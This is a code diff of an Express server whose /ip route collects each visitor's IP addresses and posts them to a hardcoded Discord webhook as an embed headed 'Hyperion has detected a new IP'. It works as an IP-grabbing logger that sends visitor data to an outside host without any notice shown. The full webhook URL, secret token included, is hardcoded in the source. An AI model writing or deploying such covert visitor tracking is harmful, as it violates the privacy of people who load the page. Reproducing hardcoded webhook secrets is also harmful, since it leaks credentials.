@@ -4,38 +4,54 @@ const path = require("path");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Webhook directo (tu webhook de Discord)
+// Webhook directo
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457199874100432970/2MP1g97e4ngqalHL7L6GsFtkV2RAvFk2JAkHkspnzizKmQ7HKr8b77msdiGxE4YTIzTf";
 
-// Servir archivos estáticos desde /public
+// Servir frontend
 app.use(express.static(path.join(__dirname, "public")));
 
-// Ruta /ip
 app.get("/ip", async (req, res) => {
-  const raw = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+  const raw =
+    req.headers["x-forwarded-for"] ||
+    req.socket.remoteAddress ||
+    "";
+
   const ips = raw.split(",").map(ip => ip.trim());
 
-  // Responder al frontend primero
+  // Respuesta al frontend
   res.json({ ips });
 
-  // Construir mensaje para Discord
-  const message = ips
-    .map((ip, index) => `Hyperion.IP ${index + 1}: ${ip}`)
+  // Construir descripción para Discord
+  const description = ips
+    .map((ip, i) => `#${i + 1}. ${ip}`)
     .join("\n");
 
-  // Enviar mensaje a Discord
+  // Payload con EMBED
+  const payload = {
+    embeds: [
+      {
+        title: "Hyperion has detected a new IP:",
+        description: description,
+        color: 16711680, // rojo
+        footer: {
+          text: "Hyperion.IP Server Log"
+        },
+        timestamp: new Date().toISOString()
+      }
+    ]
+  };
+
   try {
     await fetch(DISCORD_WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: message })
+      body: JSON.stringify(payload)
     });
   } catch (err) {
-    console.error("Error sending webhook:", err);
+    console.error("Webhook error:", err);
   }
 });
 
-// Levantar servidor
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
